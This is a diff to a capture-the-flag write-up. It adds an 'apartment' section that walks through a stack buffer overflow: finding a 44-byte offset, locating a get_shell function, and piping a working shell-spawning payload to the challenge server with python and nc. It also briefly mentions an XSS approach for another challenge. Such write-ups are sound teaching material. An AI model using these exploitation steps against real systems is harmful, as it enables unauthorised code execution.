@@ -59,7 +59,7 @@ I have no idea about Erl Elixir
 
 # Notesy
 
-We rae rovied with an URL: `http://68.183.148.46:8181/`
+We are provided with an URL: `http://68.183.148.46:8181/`
 
 **Recon** Upon visiting the webiste, I can see it's a form and after submitting I can see the actual response displayed back to my screen. There is an `Admin` section which I cannot signin. Wait, see the note "We review every submission to ensure that our services aren't being utilized for nefarious purposes", meant that the admin will check the note. It's very basic scenario that we post something and admin reviews it, by reviewing it, his browser will serve whatever content that we embedded in our post. It makes me think of [Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)). 
 
@@ -114,6 +114,67 @@ And there is our flag:
 > flag{BOOM_BIG_REVEAL_IM_A_PICKLE}
 
 # apartment
+
+We are provided with `nc 68.183.148.46 5000` and an executable
+
+Upon nc-ing to the above server, it will ask for an input. Whenever i'm being asked to enter something I always try with a bunch of AAAAAAAAA... and right in this case I got `Segmentation Fault`. It's a very first step to check for [Buffer Overflow](https://www.owasp.org/index.php/Buffer_Overflow). The executable works exactly as the server so let's analyize the file. 
+
+Here are my 3 basic steps whenever I run into Buffer Overflow Challenge:
+> 1. Check how many characters that will cause the overflow 
+> 2. Is it a shell code? or should we include our shell code?
+> 3. Dump it and jump/attach the shell code. Remember: Little Indian Unsigned Int (mostly)
+
+**Step 1:** Check how many characters that will cause the overflow 
+In order to find how many chars will cause the overflow, there is a with trick with Python code, we can pipe with with the executable:
+` python -c "print 'A'*35 | ./apartment`
+
+Keep increasing and I can see it crashes at 40. Quick tip here, after a seg fault, I use this function to see what's being overwritten:
+> dmesg | tail
+
+![](png/a2.png)
+
+But here is a problem, even though it crashes the A is not being filled (i.e: 41) in the above address and the ip (instruction pointer). Look like there is a padding here. I keep increasing the number of A and using the above function to check. Luckily I can see 41 when the number of A is 45:
+
+![](png/a3.png)
+
+I can see A (ie: 41) is being filled up, keep increasing it and it's being overwritten more. So we hit the breakpoint at **44 chars of A.**
+
+Note that for some other challenges it's not that easy. We may need to brute force the executable to find the point.
+
+**Step 2:** Is it a shell code? or should we include our shell code?
+
+Let's see what strings we can read:
+> strings apartment
+
+![](img/a1.png)
+
+Good, things are not obfuscated. And there is actually a "get shell" so we don't need to include our shell script. To check the stack and memory I usually use this:
+> readelf -s apartment | grep -i "FUNC"
+
+(Usually when this does not work we may need to use `objdump -d apartment`)
+
+![](img/a4.png)
+
+This is good, we not have the address for the `get_shell` which is `080484cd`. 
+
+**Step 3:** Jump/attach the shell code. Remember: Little Indian Unsigned Int (mostly)
+
+Now our goal is just to overwrite the return address with the shell code so that when the program ends, it will jump to the shell code. Another step here is that we (may) need to translate the address above to the little indian unsigned integer. This little python code can help with this:
+> import struct
+> struct.pack('<I', 0x080484cd)
+
+And we got our shell code address:
+> '\xcd\x84\x04\x08'
+
+Now let attach it to the python code in step 1 (see it's easy):
+`python -c "print 'A'*44 + '\xcd\x84\x04\x08'"  | ./apartment`
+
+Good now we can see the flag, let's pipe it to the nc server:
+`python -c "print 'A'*44 + '\xcd\x84\x04\x08'"  | nc 68.183.148.46 5000`
+
+Now I can spawn the shell, but I cannot do anything ... I'm stuck here and couldn't go any further :D But below is the working answer, I in fact need to `cat` it to hold the input:
+
+`(python -c "print 'A'*44 + '\xcd\x84\x04\x08'"; cat )  | nc 68.183.148.46 5000`
 
 # xml_is_hard
 
